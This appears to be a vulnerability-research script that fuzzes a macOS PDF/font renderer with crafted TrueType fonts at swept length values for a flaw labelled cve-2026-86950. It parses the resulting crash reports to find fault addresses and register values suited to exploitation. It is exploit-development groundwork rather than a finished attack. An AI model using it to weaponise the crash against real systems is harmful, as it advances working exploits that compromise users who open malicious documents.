#!/bin/bash
# RIP-9: SELF-CALIBRATING census — coarse band map -> adaptive fine sweep -> canonical
# classing. All one job, one VM session (layout-stable within session).
set -x
cd detonation/cve-2026-86950
clang -O2 -g -o render4 render4.c -framework ImageIO -framework CoreGraphics -framework CoreFoundation || exit 9
[ -x venv/bin/python ] || python3 -m venv venv
./venv/bin/pip -q install fonttools
rm -f cal.txt

./venv/bin/python - << 'PYALL'
import subprocess, os, glob, sys, re, json, time
IPS = os.path.expanduser("~/Library/Logs/DiagnosticReports")
LOG = open("cal.txt", "w")
def W(*a): print(*a); print(*a, file=LOG); LOG.flush()

def run(L):
    ttf = f"k2_c{L}.ttf"; pdf = f"k2_c{L}.pdf"
    if not os.path.exists(pdf):
        subprocess.run(['./venv/bin/python','-c',
            "import sys; sys.path.insert(0,'.'); from gen_k2 import build_font; build_font('%s', %d)" % (ttf, L)],
            check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(['./venv/bin/python','gen_pdf.py',pdf,ttf], check=True,
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    r = subprocess.run(['./render4', pdf, 'c.png'], capture_output=True, timeout=120)
    return r.returncode

# ---- phase A: coarse map
Ls = list(range(28000, 32761, 128))
rcA = {}
t0 = time.time()
for L in Ls:
    rcA[L] = run(L)
W("PHASE-A done %ds" % (time.time()-t0))
crash = sorted(L for L in Ls if rcA[L] < 0)
W("PHASE-A crash Ls: %s" % crash)
if not crash:
    W("PHASE-A: no crash band this session — abort"); LOG.close(); sys.exit(0)

# ---- phase B: adaptive fine sweep — densest crash clusters, step 8, expand edges
clusters = []
cur = [crash[0]]
for L in crash[1:]:
    if L - cur[-1] <= 256: cur.append(L)
    else: clusters.append(cur); cur = [L]
clusters.append(cur)
clusters.sort(key=len, reverse=True)
fine = set()
for cl in clusters[:2]:
    lo, hi = max(27904, cl[0]-128), min(32760, cl[-1]+128)
    pts = list(range(lo, hi+1, 16))
    if len(pts) > 75:
        pts = pts[::len(pts)//75 + 1]
    fine.update(pts)
fine -= set(Ls)
W("PHASE-B fine points: %d" % len(fine))
fine = sorted(fine)[:160]
rcB = {}
for L in sorted(fine):
    rcB[L] = run(L)
allrc = dict(rcA); allrc.update(rcB)
crashF = sorted(L for L in allrc if allrc[L] < 0)
W("PHASE-B crash Ls: %s" % crashF)

# ---- phase C: ips census (re-run crashers, collect, match by order)
for L in crashF[:40]:
    run(L)   # crash again for ips generation
time.sleep(14)
def xval(ts, i):
    try: return ts['x'][i]['value']
    except Exception: return 0
ipsFiles = sorted(glob.glob(IPS + "/render4*.ips"), key=os.path.getmtime)
W("PHASE-C ips files: %d" % len(ipsFiles))
canon = []
for i, f in enumerate(ipsFiles[-min(40, len(crashF)):]):
    L = crashF[i] if i < len(crashF) else -1
    try:
        raw = json.loads(open(f).read().split('\n',1)[1])
        codes = raw.get('exception', {}).get('rawCodes', [0,0])
        fa = codes[1] & 0xFFFFFFFFFFFFFFFF
        thr = raw.get('threads',[{}])[raw.get('faultingThread',0)]
        frs = thr.get('frames',[{}])
        site = "+%s" % frs[0].get('symbolLocation','?') if frs else '?'
        ts = thr.get('threadState',{})
        x11, x16, x27 = xval(ts,11), xval(ts,16), xval(ts,27)
        canonc = (0x100000000 <= fa <= 0x800000000000) and not (fa >= 0xff00000000000000)
        W("L=%6d site=%-7s fa=%016x x11=%x x16=%x x27=%x %s" % (L, site, fa, x11, x16, x27, "CANON" if canonc else ""))
        if canonc: canon.append((L, site, fa, x11))
        try: os.rename(f, f"ips_c{i}.ips")
        except Exception: pass
    except Exception as e:
        W("L=%s parse-err %s" % (L, e))
W("=== CANONICAL (walk-progression) CANDIDATES: %s" % canon)
LOG.close()
print("CAL DONE")
PYALL

cd ../..
mkdir -p findings
cp detonation/cve-2026-86950/cal.txt findings/ 2>/dev/null
cp detonation/cve-2026-86950/ips_c*.ips findings/ 2>/dev/null
ls findings/ | wc -l
grep -E "PHASE|CANON|L=" detonation/cve-2026-86950/cal.txt | tail -50
